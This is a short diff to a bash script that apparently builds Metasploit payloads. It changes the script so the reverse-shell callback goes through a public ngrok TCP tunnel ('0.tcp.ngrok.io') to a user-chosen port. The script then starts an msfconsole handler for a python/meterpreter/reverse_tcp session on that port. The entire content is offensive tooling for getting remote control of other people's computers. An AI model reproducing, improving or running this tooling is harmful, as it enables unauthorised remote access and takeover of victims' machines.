@@ -42,8 +42,9 @@ if [ $ask_start = 'y' ]; then
    sleep 1
    clear
    logo
-   echo 'Ngrok IP :'
-   read ip
+   echo 'Ngrok Fowarded Port(ex:4444,3333,8080,etc'
+   read fport
+   ip='0.tcp.ngrok.io'
    echo 'Ngrok Port :'
    read port
    echo 'Payload Name :'
@@ -142,7 +143,7 @@ if [ $ask_start = 'y' ]; then
            msfconsole -q -x 'use exploit/multi/handler;
            set payload python/meterpreter/reverse_tcp;
            set lhost 127.0.0.1;
-           set lport 4444;
+           set lport $fport;
            exploit'
         fi
    else
